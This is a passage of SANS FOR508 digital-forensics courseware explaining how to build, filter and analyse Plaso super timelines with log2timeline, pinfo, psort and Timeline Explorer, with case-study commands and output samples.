The text-based format contains a single line for each file path with each part of the path separated by a forward
slash. Entries can use regular expressions and wildcards to allow for both precise and broader targeting. “Path
expansion variables” extracted from Plaso preprocessing modules are also allowed (for example, the variable
{systemroot} shown in the slide).
How is a filter file built? Let’s start with an example filter entry:
/(Users|Documents And Settings)/.+/NTUSER.DAT
This regular expression states we are looking for a file within the folder "Users" or "Documents and Settings“
followed by any subfolder (.+) which includes a file specifically named NTUSER.DAT. In other words, this
line defines that Plaso should parse the NTUSER.DAT file for every user profile on the system.
Let’s try another one:
{systemroot}/winevt/Logs/.+evtx
This line tells Plaso to parse all EVTX files stored under the "winevt\Logs" path in the system root directory.

72

© 2023 SANS Institute

.

72

Note that this line contains a path expansion variable of {systemroot}. These variables are defined by curly
braces { } and they will be replaced by a path value discovered during preprocessing of a disk image. Be aware,
however, experience shows that the mapping of these variables is not 100% effective. Although it’s a nice
feature in theory, in practice it’s often better to specify the entire path rather than rely on variable discovery.
Keep in mind that all expressions in the file are case-insensitive. Special characters that should be treated as
literals should be surrounded by square brackets, for example [$]. Finally, it’s important to note that the textbased filters only define what to include. If a file or path is not defined in the filter file, it will be ignored by
log2timeline.
YAML-based Filter Files
YAML filter files were introduced to provide for a little more flexibility in defining filtering rules. The major
difference in capability is that YAML-based filtering supports exclusion rules. As such, rules can be created to
define not only what to include, but also what not to include.
For example, let’s say we wanted to do the opposite of what we did in the last example. I.e., we want to exclude
all event logs. The following YAML definition would accomplish this task:
description: Exclude Windows Event Log files
type: exclude
path_separator: '\'
paths:
- '%SystemRoot%\\System32\\config\\.+[.]evt’
In this example, we see typical YAML syntax. The important directive of “type: exclude” makes it clear that
any files or paths which match this rule should not be processed by log2timeline. The path regex looks familiar,
as well as the path expansion variable, except now the variable is surrounded by percent signs rather than curly
braces.

.

Overall, filter files provide analysts with significant flexibility in limiting the scope of log2timeline processing.
This has the dual benefit of saving valuable time and computing resources. In testing, it has reduced processing
time of full disk images by 90% on average. Employing filter files and/or limiting parsers is an important
capability that can greatly enhance a responder’s speed and effectiveness.
Reference the Plaso documentation for the latest information about filter files.[1] The Plaso team maintains a
couple of sample filter files for Windows in their GitHub repository (one text-based and one YAML-based).[2]
[1] Filter file documentation: https://for508.com/aws2z
[2] Filter files from Plaso project: https://for508.com/n0qg3

© 2023 SANS Institute

.

73

Fast Forensics/Triage Extraction
Artifact

Course Covered

Memory

• FOR500/508

Registry Hives and Backups

• FOR500

LNK Files

• FOR500

Jump Lists

• FOR500

Prefetch

• FOR500/508

Event Logs and Windows Logs

• FOR500/508

Browser Data (IE, Firefox, Chrome)
Master File Table ($MFT)

• FOR500
• FOR508

Log Files and Journal Log

• FOR508

Pagefile and Hibernation Files

• FOR508

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

With today’s large-scale intrusions and massive amounts of data, we can no longer expect to image every
system of interest. A full physical image (and memory image) is still the “gold standard” because it gives us the
greatest number of analysis options, but it simply isn’t feasible in every situation. Preparing for this situation, if
you can’t do a full disk image, what files should you consider collecting from a system to perform quick
analysis and triage?
The set of artifacts listed on this slide enables memory forensics, full registry analysis, application execution
analysis, taking advantage of any relevant event logging, and performing a good timeline analysis (though a full
super timeline analysis would require an image of the volume). A majority of the questions most analysts need
to answer could be answered by this limited set of data.
Depending on what you are investigating, there are many other items you might consider collecting: internet
browser database files, cloud storage databases, email archives, and even the entire user profile for individuals
of interest. There is no right or wrong answer. Fast forensics is limited only by the time allotted and the
knowledge and creativity of the incident responder.

74

© 2023 SANS Institute

.

74

Triage Image Timelining

log2timeline.py --storage-file out.plaso /triage-output/

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

75

.

Filter files and specifying parsers are excellent ways to speed up log2timeline and speed up your time to
investigate. However, the easiest option could be to just limit the set of data you use as input. If you have a
collection of triage files, there is no need to limit your timeline collection further. By definition, triage
collection collects the files you believe to be most vital to your investigation. Hence, it makes sense to create a
timeline from those files and it takes no additional work other than pointing log2timeline at the correct data
source. Thus, a combination of a tool like KAPE for triage collection and Plaso/log2timeline for timeline
creation creates a rapid forensics capability, allowing forensic collection and analysis to be conducted in
minutes.[1] The choice of triage tool to use is not important to this process. The most important takeaway is
log2timeline can create a timeline out of whatever collection of files you have available (KAPE just happens to
be a very easy and powerful way to collect files). This is a radical departure from traditional disk-based
forensics in that it does not require full acquisition of a massive hard drive. However, this capability does not
need to replace your existing processes. A triage image can be collected and processed while a follow-up action
acquires full disk images of the target systems. If you do this a few times, our bet is you will find very few
reasons to go back to full disk imaging as your standard operating procedure!
[1] KAPE Documentation: https://for508.com/l5o3e

© 2023 SANS Institute

.

75

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

76

© 2023 SANS Institute

.

76

Filtering the Super Timeline
Using pinfo.py and psort.py

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

77

.

This page intentionally left blank.

© 2023 SANS Institute

.

77

Plaso Database Information : pinfo.py
pinfo.py –v out.plaso

• pinfo.py displays contents of Plaso database
• -v for “verbose” information

• Information stored inside the out.plaso storage container:
• Information on when and how the tool was run
• List of all plugins/parsers used
• Filter file information (if applicable)
• Information gathered during the preprocessing stage
• A count of each artifact parsed
• Errors and storage container metadata

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

pinfo.py out.plaso

.

Pinfo.py is an important tool to validate the plaso database file. It will list the internal metadata contained in the
database to identify what was parsed, when the parsing took place, any preprocessor information, and the
plugins used to extract data. The -v option produces verbose output including preprocessor data and extensive
error messaging.

************************** Plaso Storage Information ***************************
Filename : rd01-triage.plaso
Format version : 20230327
Serialization format : json
*********************************** Sessions ***********************************
acdb8e76-22d6-450a-86a1-6a1024927d05 : 2023-07-11T04:11:16.110319+00:00
1c8a096b-7dab-4004-9831-e390cb65b45a : 2023-07-11T04:38:26.554608+00:00
******************************** Event sources *********************************
Total : 12337
<..CONTINUED..>

78

© 2023 SANS Institute

.

78

************************* Events generated per parser **************************
Parser (plugin) name : Number of events

.

amcache : 1679
appcompatcache : 1024
bagmru : 203
bam : 60
bodyfile : 935616
chrome_27_history : 3112
chrome_66_cookies : 6282
chrome_autofill : 20
chrome_preferences : 64
explorer_mountpoints2 : 8
explorer_programscache : 3
google_analytics_utma : 3
google_analytics_utmb : 3
google_analytics_utmt : 2
google_analytics_utmz : 3
lnk : 3266
mrulist_string : 24
mrulistex_shell_item_list : 14
mrulistex_string : 28
mrulistex_string_and_shell_item : 29
mrulistex_string_and_shell_item_list : 2
msie_webcache : 626
msie_zone : 72
mstsc_rdp : 5
mstsc_rdp_mru : 1
network_drives : 8
networks : 8
olecf_automatic_destinations : 1109
olecf_default : 33
oxml : 44
pe : 7483
powershell_transcript : 1151
prefetch : 2453
recycle_bin : 15
setupapi : 2374
shell_items : 6240
userassist : 117
windows_boot_execute : 2
windows_run : 15
windows_sam_users : 10
windows_services : 683
windows_shutdown : 2
windows_task_cache : 729
windows_timezone : 1
windows_typed_urls : 10
windows_version : 3
winevtx : 2283700
winlogon : 4
winreg_default : 384221
Total : 3642564
<..SNIP..>

© 2023 SANS Institute

.

79

Timeline Filtering: psort.py
psort.py --output-time-zone 'UTC' -o l2tcsv –w supertimeline.csv out.plaso FILTER

--output-time-zone ZONE Converts stored times to the specified time zone
-o FORMAT:
Choose the output module (default is “dynamic” minimal CSV)
l2tcsv Traditional CSV format used by log2timeline
opensearch Sends result into an OpenSearch database
-w FILE

Name of the output file to be written

FILTER

Filters argument (e.g., provide a date range filter)
date > datetime(‘2023-01-01T00:00:00') AND
date < datetime(‘2023-01-27T00:00:00')

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

psort is a command line tool to post-process the Plaso storage database. It provides filtering, sorting, and deduplication of the contents of Plaso database files.

.

The raw output of log2timeline is an SQLite database containing serialized event objects, metadata, tags,
reports, and various other extracted or derived information. psort is the post-processing tool used to read the
log2timeline database file and extract events from it in human-readable format. It allows post-process filtering
against a wide range of attributes (on this slide we show a simple data range filter). Importantly, it also removes
duplicate entries from the output. This is particularly helpful when including artifacts like Volume Shadow
Copies and backup registry hives. Think of psort as the tool that creates the timeline from a set of extracted
data. While you can create a timeline of all the data (the default), you can also rapidly create mini-timelines
using a range of filters, including time and artifact based. Building the plaso database takes time, but filtering
the results is typically much faster.
General Format of Command
The generic options are:
psort.py [--output-time-zone ZONE] [-o FORMAT] [-w OUTPUTFILE] STORAGE_FILE FILTER
Modify the Timezone
psort uses UTC as its default timezone when outputting events. This can be controlled using the “--output-timezone” parameter. To see a list of all supported timezones, run ”psort.py --output-time-zone list”.
Outputting Everything
The minimum number of inputs needed for this utility to run is the path to a Plaso storage file and an output file
(-w). Given this, the utility will return all events from the storage file and use UTC as the default time zone to
output events.

80

© 2023 SANS Institute

.

80

Using a Time Slice:
psort.py --slice ‘2023-08-30T20:00:00' -w slice.csv out.plaso
The time slice can be a good option when investigating a specific pivot point into the system. Let's say you have
extracted events and you then run psort with a filter to show only signs of application execution. When
examining that limited dataset, you come across an execution of something you believe is odd or something
requiring additional inspection. You can note the time and grab a "slice" from that point in time. What happens
is the tool will extract all events occurring 5 minutes before and 5 after the provided timestamp, providing a
mini-timeline for analysis. The default slice is 5 minutes before and after. That can be adjusted using the
“--slice_size” option.
Other Output Formats
The default output format is “dynamic”, which is a CSV format with a slimmed down number of fields. In
FOR508, we generally prefer the “l2tcsv” format with several additional fields. There are a number of other
output formats, including sending the data to an Elasticsearch database. Excellent for scaling analysis! To see a
list of all supported output modules, run “psort.py -o list”. Here are the modules at the time of this writing:
******************************** Output Modules ********************************
Name : Description

.

dynamic : Dynamic selection of fields for a separated value output format.
elastic : Saves the events into an Elasticsearch database.
elastic_ts : Saves the events into an Elasticsearch database for use with Timesketch.
json : Saves the events into a JSON format.
json_line : Saves the events into a JSON line format.
kml : Saves events with geography data into a KML format.
l2tcsv : CSV format used by legacy log2timeline, with 17 fixed fields.
l2ttln : Extended TLN 7 field | delimited output.
null : Output module that does not output anything.
rawpy : native (or "raw") Python output.
tln : TLN 5 field | delimited output.
xlsx : Excel Spreadsheet (XLSX) output
EXAMPLE
psort.py --output-time-zone 'UTC' -o l2tcsv -w plaso.csv out.plaso "date >
datetime(‘2023-01-01T00:00:00') AND date < datetime(‘2023-01-27T00:00:00')"
plaso - psort version 20210412
Storage file
: out.plaso
Processing time
: 00:11:33
Events:
Identifier
Main

Filtered
2020376
PID
219

In time slice Duplicates
0
530
Status
Memory
exporting
171.6 MiB

MACB grouped
454960
Events
Tags
460898 (0)
0 (0)

Total
2481274
Reports
0 (0)

Processing completed.

© 2023 SANS Institute

.

81

Case Study: Web Server Intrusion
Step 1: Parse Triage Image from Web Server
log2timeline.py –-timezone 'EST5EDT' --parsers 'winevtx,winiis’
--storage-file out.plaso /cases/IIS_Triage_Files

Step 2: Add Full MFT Metadata
log2timeline.py --parsers 'mactime’ --storage-file out.plaso
/cases/IIS_mftecmd.body

Step 3: Filter Timeline
psort.py --output-time-zone 'UTC' –o l2tcsv –w supertimeline.csv out.plaso
"date > datetime(‘2023-01-01T00:00:00') AND date < datetime(‘2023-01-27T00:00:00')"
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Putting it all together, imagine an incident occurring on a web server which you would like to investigate. With
little or no context and the need for speed, you might choose to create a limited timeline to perform alert
validation and an initial investigation. You reach across the network and export a collection of triage files from
the suspect system....

.

Step 1: log2timeline is run on the collection of triage files, focusing specifically on Windows event logs and IIS
web server logs.
Step 2: We append the contents of the Master File Table (MFT) previously parsed by the external tool
MFTEcmd into the out.plaso database. This step is a little unusual and worth discussing. While
log2timeline includes a filesystem parser (named filestat), it is designed to only provide information
from files being actively parsed by the Plaso engine (in this example only the event logs and IIS logs).
To include the entire contents of the MFT, we must parse it with an external tool like MFTEcmd, which
outputs in mactime body file format. We then use the “mactime” plugin within log2timeline to convert
and append that data to the out.plaso datastore. This is a neat trick allowing us to take better advantage
of data available in triage images when full disk images are not desired or available. You will see this
technique documented again in the timeline creation labs.
Step 3: Use psort.py to sort, filter, and build a super timeline in CSV format for review.

82

© 2023 SANS Institute

.

82

Case Study: Full Disk Super Timeline
Step 1: Parse Disk Image
log2timeline.py –-timezone 'EST5EDT’ -f filter_windows.yaml --parsers
‘win7,!filestat’ --storage-file out.plaso /cases/cdrive/disk.E01

Step 2: Add Full MFT Metadata
log2timeline.py --parsers 'mactime’ --storage-file out.plaso
/cases/mftecmd.body

Step 3: Filter Timeline
psort.py --output-time-zone 'UTC' –o l2tcsv –w supertimeline.csv out.plaso
"date > datetime(‘2023-01-01T00:00:00') AND date < datetime(‘2023-01-27T00:00:00')"
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

83

.

Building off the previous example, imagine we want to create a super timeline from a full disk image. This
could be a hard drive connected via a write-blocker, a raw or E01 disk image, or even a cloud drive snapshot
migrated to a SIFT workstation instance in the same cloud. To focus and speed analysis in this type of situation,
a Filter File would be ideal. Instead of iterating through hundreds of thousands of uninteresting files, our Filter
File can target core system artifacts. By including the contents of the $MFT bodyfile (file system timeline) in the
second step, we still preserve references to all files and their associated metadata including file size and
timestamps.
Step 1: log2timeline is run against a full disk image but focused on specific files and folders via a Filter File.
The default Windows parsers are used (win7), while removing the filestat parser (file system
information will be added in the next step)
Step 2: We append the contents of the Master File Table ($MFT) previously parsed by the external tool
MFTEcmd into the out.plaso database. The “mactime” plugin is used to parse the bodyfile format,
convert the results to log2timeline format, and append the data into the out.plaso datastore. Even with a
full disk image, we are still not parsing every file due to the Filter File, so it is necessary to parse the
$MFT file to get full information. We also prefer the format of file system output from MFTEcmd over
that of the default log2timeline parser.
Step 3: Use psort.py to sort, filter, and build a super timeline in CSV format for review.

© 2023 SANS Institute

.

83

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

84

© 2023 SANS Institute

.

84

Super Timeline Analysis
Understanding and Parsing the Super Timeline
Output File

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

85

.

This page intentionally left blank.

© 2023 SANS Institute

.

85

Timeline Output (CSV)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This is what a super timeline looks like after it is created and filtered by psort and loaded into Timeline
Explorer. Wow, what a sight—hundreds of thousands of rows and almost 20 columns. What does it all mean?
How can we analyze this much data by hand and maintain sanity? Our biggest challenge with timeline analysis
is data reduction. Analysis with the powerful filtering and search capabilities inherent in spreadsheet programs is
much easier than simple grep searches to find patterns and strings.
This section and the coming lab will teach you some tricks and help you maintain your focus during your
examination of the data. Pivot points will help significantly narrow your focus and help find starting points. At
the beginning, timeline analysis is difficult. But just like files from the operating system, you will not have to
examine all 100,000+ of them individually and you will also not have to examine the hundreds of thousands of
entries present in a super timeline. Here is what you need to know to survive your first timeline analysis.

86

© 2023 SANS Institute

.

86

Super Timeline CSV Output
date

• Date of the event, in the format of MM/DD/YYYY

time

• Time of day, expressed in a 24h format, HH:MM:SS

timezone
MACB
source
sourcetype

• Timezone specified during processing
• MACB timestamps, typically only relevant for filesystem artifacts (files and directories)
• Short name for the source
• More comprehensive description of the source

type

• Type of artifact timestamp, such as “Creation Time“ for files, or “Last Visit Time” for webhist

user

• Username associated with the entry, if relevant

host

• Hostname associated with the entry, if relevant

short

• Short description of the entry, usually contains less text than the full description field

desc

• Long description field; this is where most of the information is stored

version

• Version number of the timestamp object

filename

• Filename with the full path of the artifact which was parsed

inode

• Meta-data address of file being parsed

notes

• Some input modules insert additional information in the form of a note

format

• Name of the module that was used to parse the file

extra

• Additional information parsed from the artifact is included here

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

87

The default output of psort is CSV output (using the “dynamic” output module). However, it produces a small
subset of fields available from the log2timeline parsing engine. We prefer to use the “l2tcsv” output module for
additional fields. Considering the massive amount of information that a super timeline includes, it helps to have
more fields available for description information.

.

The following is a breakdown of the fields available using the “l2tcsv” output format:
date:
time:

Date of the event, in the format of MM/DD/YYYY

Time of day, expressed in a 24h format, HH:MM:SS
timezone:
Time zone specified during processing
MACB:
MACB meaning of the fields, typically only relevant for filesystem artifacts (files and directories)
source:
Short name for the source. All web browser history is, for instance, WEBHIST, registry entries are
REG, simple log files are LOG, and so on
sourcetype:
More comprehensive description of the source. For example, “Chrome History” instead of WEBHIST,
or “Registry Key - UserAssist” instead of REG
type:

user:

A description of the timestamp itself. Examples include basic file system timestamp descriptions such
as “Last Access Time”, “Content Modification Time”, and “Creation Time”. There are many other
descriptions as well, which define actions such as process start times (e.g., “Last Time Executed”),
website visit times (e.g., “Last Visited Time”), and file download times (e.g., “File Downloaded”).
Username associated with the entry, if relevant

© 2023 SANS Institute

.

87

host:
short:
desc:

Hostname associated with the entry, if relevant
Short description of the entry, usually contains less text than the full description field (often too little
detail to be helpful)

Long description field; this is where most of the information is stored, the actual parsed description of
the entry
version:
Version number of the timestamp object
filename:
inode:
notes:

Filename with the full path of the artifact which was parsed
Meta-data address of file being parsed

.

Some input modules insert additional information in the form of a note
format:
Name of the input module that was used to parse the file
extra:
Additional information parsed from the artifact is included here

88

© 2023 SANS Institute

.

Super
S
uper Timeline Recommended Columns (in White)
date

• Date of the event, in the format of MM/DD/YYYY

time

• Time of day, expressed in a 24h format, HH:MM:SS

timezone
MACB
source
sourcetype

• Time zone specified during processing
• MACB timestamps, typically only relevant for filesystem artifacts (files and directories)
• Short name for the source
• More comprehensive description of the source

type

• Type of artifact timestamp, such as “Creation Time“ for files, or “Last Visit Time” for webhist

user

• Username associated with the entry, if relevant

host

• Hostname associated with the entry, if relevant

short

• Short description of the entry, usually contains less text than the full description field

desc

• Long description field; this is where most of the information is stored

version

• Version number of the timestamp object

filename

• Filename with the full path of the artifact which was parsed

inode

• Meta-data address of the file being parsed

notes

• Some input modules insert additional information in the form of a note

format

• Name of the module that was used to parse the file

extra

• Additional information parsed from the artifact is included here

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

89

hi

de

The Super Timeline/Plaso output format contains many more columns than the standard “body” forensic
timeline format. This can prove challenging when viewed on a system with a small screen. To maximize your
screen real estate, we recommend starting with only the columns shown here in white. As you get more
experience or start to perform more advanced analysis, other columns may become relevant. As an example, if
you are analyzing timelines from multiple systems simultaneously, the “user” and “host” columns become
useful. The “Inode” column is useful if you plan to dig deeper into MFT records or other forensic artifacts like
the $UsnJrnl but can be hidden during times you need more screen real estate. The “extra” column is not
mandatory, but sometimes holds additional information parsed by the plugin.
Feel free to experiment and see which set of columns work best for your cases. The viewer we will be using in
class, Timeline Explorer, includes a “details” view allowing all columns to be viewed in one display, and that
display can be moved to a second monitor, so you have all of the information at your fingertips when
performing analysis. Double-click on a row to see the “details” view with every column represented. Also, note
that the column names you see on this slide are the log2timeline standard column names. Timeline Explorer has
a layout file that will slightly rename some of these columns for better readability. As examples, “desc”
becomes “Long Description” and “sourcetype” becomes “Source Description.” Timeline Explorer will also
automatically hide many of the not recommended columns, but they can be added back using its Column
Chooser feature.

© 2023 SANS Institute

.

89

.
90

© 2023 SANS Institute

.

Timeline in

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

91

.

Performing analysis within a spreadsheet is a decent starting point, but there are more powerful alternatives.
SANS instructor Eric Zimmerman created such an alternative. His dedicated tool (aptly named Timeline
Explorer), is tailor-made for processing timelines (as well as nearly any CSV or Excel file). [1] Here, we see
what our timeline looks like once loaded into Timeline Explorer. Multiple timelines can be opened at once (each
opens into a separate tab), and data is automatically color-coded according to the type of artifact. A legend is
available under the “Help” menu showing what each color indicates. In the example on this slide, you can tell
when USB devices were utilized in the timeline (blue). You can also tell when files were opened (green) and
when programs were executed (red).
Timeline Explorer can open nearly any CSV or Excel document (first worksheet only) and display the contents
in a grid. This data is read-only and cannot be changed by someone viewing the data. It supports a wide variety
of formats including Autoruns, Mactime-generated timelines, Plaso super timelines, and all of Eric
Zimmerman's command line tools (CSV output).
Shortcuts
CTRL-E: Clear filters
CTRL-T: Tag or untag selected rows
CTRL-R: Reset column widths
CTRL-D: Bring up Details (for use with super timelines)
CTRL-C: Copy selected cells (and headers) to clipboard (the behavior can be adjusted via the Tools menu)
CTRL-F: Show Find dialog
CTRL-Down: Select last row
CTRL-SHIFT-A: Select all values in current column
Wildcards
Wildcards are supported in column filters when using the LIKE operator. % matches anything and _ matches a
single character. CONTAINS implies wildcards and is the default, but using LIKE along with wildcard
operators can often be more precise.

© 2023 SANS Institute

.

91

Tagging allows for selecting a subset of data, filtering on it, then exporting to Excel format using the File menu.
This technique allows you to get data out of the tools for reporting purposes. Tagging can also be used to notate
interesting results and go back to them as needed.
Double-clicking any item in a Plaso super timeline brings up the Details window. It allows for more
comprehensive inspection of data in a non-horizontal format. This format is particularly useful when reviewing
event log entries. There are options to make the Details window the topmost window and buttons to move to the
next or previous record.
Search options menu
The location of the search options menu varies depending on the version of Timeline Explorer. This menu
controls how the global search bar operates. As an example, you can set search to default to “Filter” or
“Search”. Filtering can be very powerful as any rows not containing the search term used are filtered out of the
view. If Search is selected instead, search hits will be highlighted, but no rows will be filtered out.
Layouts
For all supported file types, layout files are saved and loaded as needed. The layout files contain settings for that
file type, such as which columns are shown, the order of columns, conditional formatting rules, and so on.
These files are stored in the “Layout” folder where Timeline Explorer is installed on the system. Layout files
are what tells the tool how to colorize specific lines.
Your first several tries at accomplishing timeline analysis will be challenging due to learning how to filter
thousands of lines of data while learning and memorizing exactly what artifact patterns are useful. Typically, I
have found one thing to be true: Unless I need them, I generally remove any temporary internet files—there are
just too many. You will start to have your own preferences as well. Use the colors to draw your attention to
interesting parts of the timeline, but don’t focus solely on them! Many interesting artifacts (like event logs) are
not colored because doing so would be visually overwhelming.

.

Eric Zimmerman is very open to feedback and feature requests from students. If there is something you would
like to see in Timeline Explorer, please reach out to Eric!
For those curious as to the origins of this analysis technique, the original timeline colorization was released as an
Excel template. If you prefer using Excel, you can find the process and template on the SANS website.[2]
[1] Eric Zimmerman’s Tools: https://for508.com/8t6pb
[2] Digital Forensic SIFTing: Colorized Super Timeline Template: http://for508.com/relfp

92

© 2023 SANS Institute

.

.
© 2023 SANS Institute

.

93

Timeline Analysis Process
Determine Timeline Scope: What questions do you need to
answer?
Narrow Pivot Points
• Time-based
• Artifact-based
Determine the Best Process for Timeline Creation
• Filesystem-Based Timeline Creation – FLS or MFTECmd – FAST (TRIAGE MODE)
• Super Timeline Creation – Automated or Targeted – LOG2TIMELINE

Filter Timeline

Analyze Timeline
• Focus on the context of evidence
• Use Windows Forensic Analysis Poster “Evidence of…”

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Determine Timeline Scope through analysis of the key questions and the case type. Generally, you can identify
that the activity occurred between date A and date B. Narrowing the scope will be important in managing your
overall data.

.

Narrow Pivot Points through determining the closest time around when you think the incident occurred (timebased) ,or identifying a key file, user account, or other artifact that might have been used in the activity in
question (artifact-based).
Determine the Best Process for Timeline Creation by looking at what data sources you need. A super timeline
is preferred if you do not know what you are looking for and you might need to include everything. However, if
you can predict the data necessary to solve your case, a targeted super timeline or filesystem timeline might
suffice.
Filter Timeline using your scope, de-duplicate, and eliminate data you do not need to examine. Consider using
keywords to identify relevant data (pivot points) for your analysis.
Analyze Timeline through focusing on the context of evidence discovered. Look before and after each pivot
to determine user activity. Use the Windows Forensic Analysis Poster “Evidence of” items to help with
analysis.

94

© 2023 SANS Institute

.

94

Optional Homework
Lab 4.3A (Windows) or 4.3B (Linux)
Super Timeline Creation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

95

.

This page intentionally left blank.

© 2023 SANS Institute

.

95

Lab 4.4
Super Timeline Analysis
Average Time: 40 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

96

© 2023 SANS Institute

.

96

Scaling Timeline Analysis

• Search timelines for IOCs
• yara_match.py

• Use a database to investigate multiple timelines
• Splunk
• ELK

• Timesketch

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

97

.

Hopefully, by this point, you see the value of timeline analysis and its ability to provide quick answers to
forensic questions. Now imagine the ability to get those questions answered at scale. Here we see two ways to
attack the challenge of performing timeline analysis across many timelines simultaneously. One easy solution is
to look for obvious indicators of compromise across a collection of timeline files. This could be as simple as
performing regular expression searches across a folder of timelines or utilizing an IOC framework like YARA.
Even basic checks like looking for executables in the $Recycle.Bin, svchost.exe in a folder other than
Windows\System32, known recon tool execution, or the names of known bad files and registry keys could
quickly identify timelines worth looking deeper into. Kristinn Gudjonsson, the creator of Plaso, wrote a script
named yara_match.py to facilitate searching a super timeline for a list of YARA signature matches.[1]
Loading multiple timeline files into a database is a more robust approach. Splunk (free or commercial version)
makes a great choice for indexing and searching timelines.[2] Dave Herrald released a Splunk App to make it
easy to ingest timelines in the log2timeline format.[3] ELK, an acronym for elasticsearch + logstash + kibana, is
a very popular (and free) software stack used to ingest massive amounts of data, index and create dashboards to
facilitate analysis and data visualization. Plaso ships with an output format designed to be used with ELK (the
output option is named “elastic”).[4] Getting multiple timelines in a database allows searching for patterns across
many timelines at once. Taking things a step further, Johan Berggren created a front-end to log2timeline and
elasticsearch named timesketch.[5] Timesketch allows multiple investigators to collaborate across many
timelines in real-time all while tagging, annotating and enriching the data. When you are ready to take things to
the next level, these projects will help you get there.
[1] l2t-tools/yara_match: https://for508.com/5v687
[2] Using Splunk for Computer Forensics: https://for508.com/nuvhm
[3] Dave Herrald SA_plaso-app-for-splunk: https://for508.com/4flp[4] Plaso and elasticsearch: https://for508.com/46auk
[5] Google timesketch, collaborative forensic timeline analysis: https://for508.com/uft34

© 2023 SANS Institute

.

97

Optional Homework
Lab 4.5
Scaling Timeline Analysis with ELK

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Visit https://for508.com/srl-elk for a short video tutorial on the SRL ELK instance.

98

© 2023 SANS Institute

.

98

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

99

.

This page intentionally left blank.

© 2023 SANS Institute

.

99

COURSE RESOURCES AND CONTACT INFORMATION
Here is my lens. You know my methods. –Sherlock Holmes
AUTHOR CONTACT
rlee@sans.org
http://twitter.com/robtlee

SANS INSTITUTE
11200 Rockville Pike, Suite 200
N. Bethesda, MD 20852
301.654.SANS(7267)

ctilbury@sans.org
http://twitter.com/chadtilbury
mpilkington@sans.org
https://twitter.com/mikepilkington

SANS EMAIL
DFIR RESOURCES
digital-forensics.sans.org
Twitter: @sansforensics

GENERAL INQUIRIES: info@sans.org
REGISTRATION: registration@sans.org
TUITION: tuition@sans.org
PRESS/PR: press@sans.org

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

100

© 2023 SANS Institute

.

100

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

508.5

.

Advanced Adversary
and Anti-Forensics Detection

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
